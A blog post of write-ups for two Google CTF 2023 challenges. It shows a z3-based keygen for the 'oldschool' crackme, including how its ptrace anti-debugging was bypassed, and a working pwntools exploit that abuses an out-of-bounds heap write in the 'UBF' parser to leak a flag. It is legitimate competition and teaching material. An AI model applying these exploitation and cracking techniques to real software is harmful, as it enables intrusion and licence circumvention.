---
title: Writeups from Google Capture The Flag 2023
excerpt: "A year ago I started my journey here with a misc and a web challenge. This year I can present you two binary challenge solutions!"
---

<script lang="ts">
	import Challenge from '$lib/components/Challenge.svelte';

    let oldschool_downloads = ["/blog/2023/05_google-ctf-23/oldschool.zip", "/blog/2023/05_google-ctf-23/solution.zip"];
    let ubf_downloads = ["/blog/2023/05_google-ctf-23/ubf.zip"];

    import oldschool_login_screen from "$lib/assets/2023/05_google-ctf-23/oldschool_login_screen.png";
    import oldschool_password_check_flow from "$lib/assets/2023/05_google-ctf-23/oldschool_password_check_flow.svg";
    import ubf_memory_dump from "$lib/assets/2023/05_google-ctf-23/ubf_memory_dump.svg";
</script>

Two weeks ago, after being busy organizing our second event, [GPN CTF 2023](https://ctftime.org/event/1965), my team [KITCTF](https://kitctf.de) finally had time to fully participate in a CTF.
And since we like the challenge, what better CTF could there be than Google Capture the Flag 2023?!

Funny enough, I started to really dive deep into cybersecurity and CTFs with last year's Google CTF 22 and managed to solve two challenges ([misc](https://kitctf.de/writeups/appnote) and [web reversing](https://kitctf.de/writeups/jssafe)) then. 
In the past year I learned a lot about reversing and lately pwning so this year I worked on the binary rev/pwn challenges [oldschool](#oldschool) and [UBF](#ubf).

## oldschool

<Challenge name="oldschool" category="rev" solves={56} points={189} flag="CTF&lbrace;991d90ed198acc794d6dacd7e304f761c142acab&rbrace;" downloads={oldschool_downloads}>
This challenge takes you back to the (good) old days of crackmes.de.
Your goal for this challenge is to write a "keygen", a program that
generates valid passwords for arbitrary given usernames.
You are also given `flag_maker.py` that contains a list of usernames
that you have to find their corresponding passwords.
Once you find all passwords, run the script and you will get the flag.
</Challenge>

**TL;DR:** oldschool is a classic crackme binary with an interesting password check method we have to reverse.
It uses ncurses terminal UI and anti-debugging measures as a small twist though.

The challenge provides us with a 32-bit crackme binary and a python script containing the 50 usernames we need to find the password for.
A crackme is a small program designed to test your reversing skills in a legal way.
They often require finding secret data and understanding their authentication schema to obtain access.
The page crackmes.de referenced in the description was a website that hosted many such challenges until 2016 (shutdown because of legal issues).
Currently, the page [crackmes.one](https://crackmes.one/) host many of the original crackmes.de challenges as well as new ones, in case you like to try them out.

The binary uses the [ncurses](https://invisible-island.net/ncurses/announce.html) library that provides a terminal-independent UI programming API.
Thus you may need to install the 32-bit ncurses package to execute the library.
Also, the binary seems to require a certain screen size so I needed to decrease the terminal font size a bit to get past this error.
If everything is working fine you should see an window similar to this:

![oldschool login screen]({oldschool_login_screen})

While executing and later debugging the binary helps understanding the program I needed to look at its code first to see what it does internally.
Thus, I fired up my debugger and tried to execute the program while it was loading.
I used ghidra for this challenge which works fine but I have to warn you that the main method will take a few minutes to load on every edit.
Although it repeats the error cases to free ncurses resources it does produce an otherwise quite readable result.
Binary ninja is a lot quicker but did nest every error check which produced a lot of nesting levels.
In the end, you should probably stick to the tools your used to anyway.

I tried looking through the main method linearly at first but quickly abandoned this approach as it is just too big.
Then I looked at the imported library methods and found the method [`new_field`](https://manpages.debian.org/testing/ncurses-doc/new_field.3form.en.html) which is used to create six fields.
By their size and positioning I assumed them to be the labels, text fields and buttons.
Tracing the usages of the first buttons I found the login case and a method that was passed the username and password (updated char by char on every edit of the field in a handler elsewhere).
This method determines the login result and thus I will subsequently call it `password_check`.

### Passing the password check

The `password_check` contains a few error cases regarding the format of usernames and passwords.
For example, a username must consist of at least five blocks of four characters and the password too, though separated by hyphens.
However, the most important check is an equation at the end of the function that uses a list of 25 values computed from the username and 25 others from the password.

![Structure of the `password_check` method]({oldschool_password_check_flow})

The values from the password are the indices in a string of valid characters: `"23456789ABCDEFGHJKLMNPQRSTUVWXYZ"`.
As every string in the binary it is stored as two byte arrays that are XORed to get the real string.
The values in this initial `password_list` are then remapped via a shuffle map, XORed with map of values by their position in the list and finally rotated right in blocks of 5 depending on the index of the block (no change on block 0, block 1 rotated right by one and so on).
Now, I didn't look at the computation of the `username_list` in detail because we know the usernames and can just copy the code.
The final equation for checking password and username is generated like this:

```c
for (user_block = 0; (int)user_block < 5; user_block = user_block + 1) {
  for (pass_index = 0; pass_index < name_blocks; pass_index = pass_index + 1) {
    check = 0;
    for (user_index/pass_block = 0; (int)user_index/pass_block < 5; user_index/pass_block = user_index/pass_block + 1) {
      check = check + username_list[user_index/pass_block + user_block * 0x10] * password_list[user_index/pass_block * 5 + pass_index] & 0x1f;
    }
    if (((user_block == pass_index) && (check != 1)) || ((user_block != pass_index && (check != 0)))) {
      return 0;
    }
  }
}
result = 1;
```

The resulting strategy for finding the password to a given username I used was as follows:
1. Generate `username_list` from name
2. Solve equation for modified `password_list` with `z3`
3. Undo the modifications in reverse order to get password

### Anti-debugging and final solution

To test my approach and find out where it failed (because the equation wasn't satisfiable for almost all usernames) I wanted to debug the crackme a bit.
With help from my team I managed to run the binary without errors using `gdbserver` on `localhost:1337` and connect from `gdb` via the command `target remote localhost:1337`.
I then noticed changes in the global `XOR_MAP` with the XOR values for the password_list, in a map used to generate the `username_list` (I called it `USERGEN_MAP`) and in a global integer used as a starting value for the `username_list` generation (I called it `USERGEN_BASE`).
After updating my values accordingly I managed to produce a correct login for the first username but the rest of the equations still weren't satisfiable.
Additionally, the example only worked under the debug environment and not during normal execution.
I knew the concept of such anti-debugging measures but they still managed to delay me because I couldn't find any `ptrace` call that is usually used for this.
In case you haven't yet come across such measures, they usually call `ptrace` on themselves to check whether a debugger is attached to the process.
After rechecking the values I copied from the binary I later traced the modifications on the global variables and found they all used a global boolean.
This boolean was indeed a `ptrace_bit` set with the result of a `ptrace` system call, only ghidra didn't manage to resolve the 32-bit call as such.

The modifications on the global variables are as follows:
- The `XOR_MAP` values are XORed with 2, or 4 if the `ptrace_bit` is set
- In the `USERGEN_MAP` two uints are swapped skipping one value, starting with offset one if the `ptrace_bit` is set
- If the `ptrace_bit` is set, the `USERGEN_BASE` value is increased by 7

With these modifications included my script produced satisfiable equations for a few selected usernames under default circumstances.
So i finished my solver and generated the passwords for all usernames in the `flag_maker.py` to get the flag.

```py
import subprocess
import z3

PASSWORD_MAP = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"

PTRACE_BIT = 0

SHUFFLE_MAP = [ 0x10, 0xE, 0xD, 0x2, 0xB, 0x11, 0x15, 0x1E, 0x7, 0x18, 0x12, 0x1C, 0x1A, 0x1, 0xC, 0x6, 0x1F, 0x19, 0x0, 0x17, 0x14, 0x16, 0x8, 0x1B, 0x4, 0x3, 0x13, 0x5, 0x9, 0xA, 0x1D, 0xF ]
XOR_MAP = [ 0x19, 0x2, 0x8, 0xF, 0xA, 0x1A, 0xD, 0x1E, 0x4, 0x5, 0x10, 0x7, 0xE, 0x0, 0x6, 0x1F, 0x1D, 0xB, 0x11, 0x3, 0x1C, 0x13, 0x9, 0x14, 0x1B, 0x15, 0x1, 0xC, 0x18, 0x16, 0x17, 0x12 ]

if PTRACE_BIT == 0:
    for pos in range(0x20):
        XOR_MAP[pos] ^= 2
else:
    for pos in range(0x20):
        XOR_MAP[pos] ^= 4

# gdwAnDgwbRVnrJvEqzvs
# username_list = [18,29,16,19,27,0,0,0,0,0,0,0,0,0,0,0,8,31,8,23,30,0,0,0,0,0,0,0,0,0,0,0,29,3,28,10,21,0,0,0,0,0,0,0,0,0,0,0,18,29,8,16,28,0,0,0,0,0,0,0,0,0,0,0,11,30,7,20,7,0,0,0,0,0,0,0,0,0,0,0]


def solve_for_password_list(username_list: list[int]) -> list[int]:
    solver = z3.Solver()

    password_list = [0] * 25
    for i in range(25):
        password_list[i] = z3.BitVec("p" + str(i), 4 * 8)
        solver.add(password_list[i] < 0x100)
        solver.add(password_list[i] >= 0)

    for pos in range(5):
        for index in range(5):
            local_58 = 0
            for j in range(5):
                local_58 = (
                    local_58 + username_list[j + pos * 0x10] * password_list[j * 5 + index]
                    & 0x1F
                )

            solver.add(z3.If((pos == index), (local_58 == 1), (local_58 == 0)))

    assert solver.check() == z3.sat

    model = solver.model()
    result_list = [0] * 25
    for i, p in enumerate(password_list):
        result_list[i] = model[p].as_long()

    return result_list


# gdwAnDgwbRVnrJvEqzvs
# IN_LIST = [18, 21, 12, 14, 2, 1, 31, 11, 30, 16, 21, 8, 27, 11, 26, 0, 13, 19, 2, 14, 28, 8, 12, 31, 3]

def unshuffle(in_list: list[int]) -> str:
    list1 = [0] * 25
    for round in range(5):
        for offset in range(5 - round):
            list1[round * 5 + round + offset] = in_list[round * 5 + offset]

        for offset in range(round):
            shifted = 5 - (round - offset)
            list1[round * 5 + offset] = in_list[round * 5 + shifted]

    list2 = [0] * 25
    for pos in range(5):
        for index in range(5):
            list2[pos * 5 + index] = list1[pos * 5 + index] ^ XOR_MAP[(index + pos * 5)]

    list3 = [0] * 25
    for pos in range(5):
        for index in range(5):
            list3[pos * 5 + index] = SHUFFLE_MAP.index(list2[pos * 5 + index])

    password = ""
    for block in range(5):
        for offset in range(5):
            password += PASSWORD_MAP[list3[block * 5 + offset]]

        password += "-"

    return password[:-1]


def solve_password_for(username: str) -> str:
    username_list_str = subprocess.check_output(["./generate_username_list", username])[
        :-2
    ].decode()
    username_list = [int(val, 10) for val in username_list_str.split(",")]

    password_list = solve_for_password_list(username_list)
    password = unshuffle(password_list)
    return password

```

The complete solution is included in the solution archive provided above.

## UBF

<Challenge name="UBF" category="rev" solves={52} points={197} flag="CTF&lbrace;Respl3nd4nt-C0nd1tion@l-El3ments&rbrace;" downloads={ubf_downloads}>
Please review and test this Unnecessary Binary Format (UBF)!

Connection: `ubf.2023.ctfcompetition.com 1337`
</Challenge>

**TL;DR:** the challenge is a UBF parser with an out of bounds write vulnerability in boolean arrays because of missing header checks.
This vulnerability allows us to overwrite string data and get the uncensored flag.

The provided binary is an unpacking utility for a custom binary data format.
It accepts a blob of base64-encoded data, tries to interpret this data as its custom format and unpack it and then prints the unpacked data or an error message as a result.

The binary format contains at least one block of data, so called entries, that must contain a header of a certain length and structure and data depending on its type.
UBF supports three data types:
- **String arrays:** contain a short array of lengths and then the raw string data
  - Support environment variable expansion via `$NAME`
  - Flag strings are later censored before printing
- **Int arrays:** contain raw integer bytes as data
- **Boolean arrays:** contain raw boolean bytes as data

Now, the header contains a bunch of type and size information, some of them redundant:
- The initial size of the data buffer for the parsed entry
- The type byte, `'s'` for strings, `'i'` for integers and `'b'` for booleans
- The number of array entries
- The raw length of the data

Now, there are a few relevant checks, especially for string arrays, to avoid data corruption:
- The raw length must be the size of the raw data entry (the shorts containing the length for string arrays) multiplied with the number of array entries.
- The initial size of the entry buffer must fit at least the raw length.
-The copied data may not exceed the input data

All these checks seem to be correctly implemented for string arrays but integer arrays and boolean arrays simply ignore the specified raw length.
Now, @ju256 (with whom I worked on this challenge) noted the suspiciously named method `fix_corrupt_booleans()`.
This method converts up to the number of entries of bytes to real booleans after the copied data while respecting the initial size of the data buffer.
Now, this method may fix the boolean data that was copied, but only if
the specified raw length is zero.
Since this value is never checked though and the only bounds check on this fix is an upper bounds check we can use negative values to abuse this out of bounds (OOB) heap write vulnerability.

```c
void censor_string(char *input,int length)
{
  if ((((5 < length) && (*input == 'C')) && (input[1] == 'T')) &&
     ((input[2] == 'F' && (input[3] == '{')))) {
    memset(input + 4,L'X',(long)(length + -5));
  }
  return;
}
```

Our ultimate goal for this challenge is to use variable expansion to get the flag string and somehow avoid it being censored.
Because of the check in the `censor_string()` function we can do so by first sending a string array and then a boolean array and using the vulnerability we found to change one of the `'CTF{'`-bytes to `0x01`.
Even better, we can overwrite the length short at the start of the data buffer with `0x01` with disables the check in this method and still gives us the whole string because it is printed with `snprintf()` and `%s` ignoring the supposed length.
To consistently place the two allocated heap blocks for the entries at a fixed offset from each other on the stack we can set the same initial buffer size.
This is because heap allocation strategies typically place blocks of the same size together to utilize memory space as best as possible.
See the memory dump below to understand the offset:

![Memory dump of entry structures in fix_corrupt_booleans()]({ubf_memory_dump})

The final solution simply builds such a payload with a working offset and sends the base64-encoded data:

```py
import pwn
import base64

def example_str():
    data = b""

    words = [b"Example", b"$FLAG", b"$MOTD", b"$TEAM"]

    data += pwn.p32(len(words)*2) # initial length
    data += b's' # type
    data += pwn.p16(len(words)) # blocks
    data += pwn.p16(len(words)*2) # raw length of blocks

    for w in words:
        data += pwn.p16(len(w))
    for w in words:
        data += w

    print(data)
    
    return data

def example_bool():
    data = b""

    bools = [True, False]

    data += pwn.p32(len(bools)) # initial length
    data += b'b' # type
    data += pwn.p16(len(bools)) # blocks
    data += pwn.p16(5 & 0xffff) # raw length of blocks

    for b in bools:
        data += b"\\01" if b else b"\\00"

    print(data)
    
    return data

def payload():
    data = b""

    words = [b"$FLAG"]

    data += pwn.p32(0x200) # initial length
    data += b's' # type
    data += pwn.p16(len(words)) # blocks
    data += pwn.p16(len(words)*2) # raw length of blocks

    for w in words:
        data += pwn.p16(len(w))
    for w in words:
        data += w

    bools = [True]

    data += pwn.p32(0x200) # initial length
    data += b'b' # type
    data += pwn.p16(len(bools)) # blocks
    data += pwn.p16((-0x240) & 0xffff) # offset to overwrite length, use -0x23e to overwrite the first 'C' 

    for b in bools:
        data += b"\\01" if b else b"\\00"
    
    return data 

with pwn.remote("ubf.2023.ctfcompetition.com", 1337) as conn:
    data = payload()
    conn.recvuntil(b"Enter UBF data base64 encoded:\n")
    conn.sendline(base64.b64encode(data))

    print(base64.b64encode(data))

    print(conn.recvall().decode())


```